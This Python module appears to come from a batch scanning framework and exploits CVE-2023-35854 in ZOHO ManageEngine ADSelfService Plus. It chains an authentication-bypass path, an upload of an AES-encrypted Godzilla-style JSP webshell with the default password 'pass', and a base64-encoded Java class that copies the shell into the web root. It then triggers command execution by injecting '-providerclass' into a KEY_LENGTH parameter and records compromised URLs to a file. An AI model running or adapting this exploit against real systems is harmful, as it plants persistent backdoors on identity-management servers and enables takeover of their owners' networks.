#!/user/bin/env python3
# -*- coding: utf-8 -*-

import requests, warnings
from requests.packages import urllib3
from base64 import b64decode
from io import BytesIO
from pub.com.outprint import OutPrintInfo, OutPrintInfoSuc
from pub.com.reqset import ReqSet

urllib3.disable_warnings()
warnings.filterwarnings("ignore")


class Cve_2023_35854:
    def urlget(self, url, count=0):
        max_count = 1
        if count > max_count:
            return 0
        try:
            response = requests.get(url, timeout=10, verify=self.ssl, headers=self.headers, proxies=self.proxy)
            status_code = response.status_code
            return status_code
        except:
            return self.urlget(url, count + 1)

    def check(self, url, count=0):
        max_count = 1
        if count > max_count:
            if not self.batch:
                OutPrintInfo("ZOHO", f"递归超过限制: {url}")

            return

        status_code = self.urlget(url)
        if status_code == 200:
            self.check1(url)
        elif status_code == 0:
            if not self.batch:
                OutPrintInfo("ZOHO", f"访问失败: {url}")

            return
        else:
            new_url = self.redirect_url(url)
            self.check(new_url, count + 1)

    def redirect_url(self, url):
        if url.startswith("https://"):
            new_url = url.replace("https://", "http://")
        else:
            new_url = url.replace("http://", "https://")

        return new_url

    def check1(self, turl):
        check_bypass_endpoint = "/./RestAPI/LogonCustomization"
        chek_url = turl + check_bypass_endpoint
        try:
            s = requests.Session()
            data = {"methodToCall": "previewMobLogo"}
            req = requests.Request(url=chek_url, method='POST', data=data)
            prep = req.prepare()
            prep.url = chek_url
            response = s.send(prep, timeout=8, verify=self.ssl, headers=self.headers, proxies=self.proxy)
            if '<script type="text/javascript">var d = new Date();' in response.text:
                self.upload_jsp(turl)
            else:
                if not self.batch:
                    OutPrintInfo("ZOHO", f"{chek_url}--Target doesn't seem vulnerable")
        except Exception as e:
            if not self.batch:
                OutPrintInfo("ZOHO", f"{turl}---url请求失败")

    def upload_jsp(self, turl):
        upload_url = turl + "/./RestAPI/LogonCustomization"
        webshell = """
    <%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
    %>"""
        files = {'CERTIFICATE_PATH': ('crazy.txt', webshell)}
        data = {"methodToCall": "unspecified", "Save": "yes", "form": "smartcard", "operation": "Add"}
        try:
            s = requests.Session()
            req = requests.Request(url=upload_url, method='POST', files=files, data=data)
            prep = req.prepare()
            prep.url = upload_url
            response = s.send(prep, timeout=15, verify=self.ssl, headers=self.headers, proxies=self.proxy)
            if response.status_code == 404:
                self.upload_java_class(turl)
            else:
                if not self.batch:
                    OutPrintInfo("ZOHO", f"{upload_url}---Can't upload webshell")

        except Exception as e:
            if not self.batch:
                OutPrintInfo("ZOHO", f"{turl}---jsp请求失败")

    def upload_java_class(self, turl):
        upload_url = turl + "/./RestAPI/LogonCustomization"
        java1_8_payload_b64 = "yv66vgAAADQALAoADgAYBwAZCAAaCAAbCAAcCAAdCAAeCgAfACAKAB8AIQgAIggAIwcAJAcAJQcAJgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACQBAApTb3VyY2VGaWxlAQAKQ3JhenkuamF2YQwADwAQAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAEAAi9jAQAEY29weQEACWNyYXp5LnR4dAEAKC4uXHdlYmFwcHNcYWRzc3BcaGVscFxhZG1pbi1ndWlkZVxseS5qc3AHACcMACgAKQwAKgArAQADZGVsAQALQ3JhenkuQ2xhc3MBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAFQ3JhenkBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQANAA4AAAAAAAIAAQAPABAAAQARAAAAHQABAAEAAAAFKrcAAbEAAAABABIAAAAGAAEAAAADAAgAEwAQAAEAEQAAAL8ABAAGAAAAcAi9AAJZAxIDU1kEEgRTWQUSBVNZBhIGU1kHEgdTS7gACCq2AAlMB70AAlkDEgNTWQQSBFNZBRIKU1kGEgZTTbgACCy2AAlOB70AAlkDEgNTWQQSBFNZBRIKU1kGEgtTOgS4AAgZBLYACToFpwAES7EAAQAAAGsAbgAMAAIAEgAAACYACQAAAAYAHgAHACYACAA/AAkARwAKAGEACwBrAA0AbgAMAG8ADgAUAAAACQAC9wBuBwAVAAABABYAAAACABc="
        files = {'CERTIFICATE_PATH': ('Crazy.class', BytesIO(b64decode(java1_8_payload_b64)))}
        data = {"methodToCall": "unspecified", "Save": "yes", "form": "smartcard", "operation": "Add"}
        try:
            s = requests.Session()
            req = requests.Request(url=upload_url, method='POST', files=files, data=data)
            prep = req.prepare()
            prep.url = upload_url
            response = s.send(prep, verify=self.ssl, headers=self.headers, proxies=self.proxy)
            if response.status_code == 404:
                self.execute_rce(turl)
            else:
                if not self.batch:
                    OutPrintInfo("ZOHO", f"{upload_url}---Can't upload Java Class")

        except Exception as e:
            if not self.batch:
                OutPrintInfo("ZOHO", f"{turl}---java_class请求失败")

    def execute_rce(self, turl):
        rce_url = turl + "/./RestAPI/Connection"
        s = requests.Session()
        data = {"methodToCall": "openSSLTool", "action": "generateCSR",
                "KEY_LENGTH": '1024 -providerclass Crazy -providerpath "..\\bin"'}
        req = requests.Request(url=rce_url, method='POST', data=data)
        prep = req.prepare()
        prep.url = rce_url
        try:
            response = s.send(prep, verify=self.ssl, headers=self.headers, proxies=self.proxy)
            if response.status_code == 404:
                self.verify_webshell(turl)
            else:
                if not self.batch:
                    OutPrintInfo("ZOHO", f"{rce_url}---Can't trigger RCE from Java Class")

        except Exception as e:
            if not self.batch:
                OutPrintInfo("ZOHO", f"{turl}---rce请求失败")

    def verify_webshell(self, turl):
        webshell_url = turl + "/help/admin-guide/ly.jsp"
        try:
            response = requests.post(webshell_url, data={}, verify=self.ssl, headers=self.headers, proxies=self.proxy)
            if (response.status_code == 404):
                if not self.batch:
                    OutPrintInfo("ZOHO", f"{webshell_url}---Can't find webshell")
            else:
                OutPrintInfoSuc("ZOHO", f"{webshell_url}---Webshell successfully upload.")
                OutPrintInfo("ZOHO", f"哥斯拉连接默认密码pass\n")
                if self.batch:
                    with open("./result/zoho_2023_35854.txt","a") as w:
                        w.write(f"{webshell_url}------哥斯拉连接默认密码pass\n")
        except Exception as e:
            if not self.batch:
                OutPrintInfo("ZOHO", f"{webshell_url}---Can't parse response")


    def main(self, target):
        self.batch = target["batch_work"]
        if not self.batch:
            OutPrintInfo("ZOHO", '开始执行ZOHO ManageEngine ADSelfService Plus 文件上传漏洞检测')
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)


        self.check(url)
        if not self.batch:
            OutPrintInfo("ZOHO", 'ZOHO ManageEngine ADSelfService Plus 文件上传漏洞检测执行结束')




